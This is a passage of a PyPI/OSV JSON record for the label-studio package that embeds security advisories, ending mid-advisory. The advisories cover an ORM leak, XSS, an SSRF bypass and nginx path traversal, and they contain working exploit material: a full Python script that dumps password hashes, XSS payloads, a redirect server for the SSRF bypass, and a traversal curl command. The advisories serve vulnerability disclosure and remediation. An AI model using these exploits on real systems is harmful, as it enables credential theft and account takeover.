*filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.8":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.8/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.11)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.8","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"c471ba53c7cb56c2272e2b1231d8e2d11781875d12991e81af210bdce679ffbc","md5":"04cc0a1197a6da81f1c7085da0fff990","sha256":"d92b5fffe5c8446bb8f207495e498d5e0a5fdebd7d31e8c006b85aa477f27c4d"},"downloads":-1,"filename":"label_studio-0.4.8-py3-none-any.whl","has_sig":false,"md5_digest":"04cc0a1197a6da81f1c7085da0fff990","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7344020,"upload_time":"2020-02-26T13:36:52","upload_time_iso_8601":"2020-02-26T13:36:52.516028Z","url":"https://files.pythonhosted.org/packages/c4/71/ba53c7cb56c2272e2b1231d8e2d11781875d12991e81af210bdce679ffbc/label_studio-0.4.8-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"830e2894542e321a717fae41aa87a6d112190fb3ed544257bd81a4271af731b4","md5":"c57966f464b84a823c83e58f1501d7a2","sha256":"68bc11f780be46f04727acf4e979da2bd90722c6bf1ebb75f26f2a8f555ca2c0"},"downloads":-1,"filename":"label-studio-0.4.8.tar.gz","has_sig":false,"md5_digest":"c57966f464b84a823c83e58f1501d7a2","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7268083,"upload_time":"2020-02-26T13:37:03","upload_time_iso_8601":"2020-02-26T13:37:03.139068Z","url":"https://files.pythonhosted.org/packages/83/0e/2894542e321a717fae41aa87a6d112190fb3ed544257bd81a4271af731b4/label-studio-0.4.8.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings 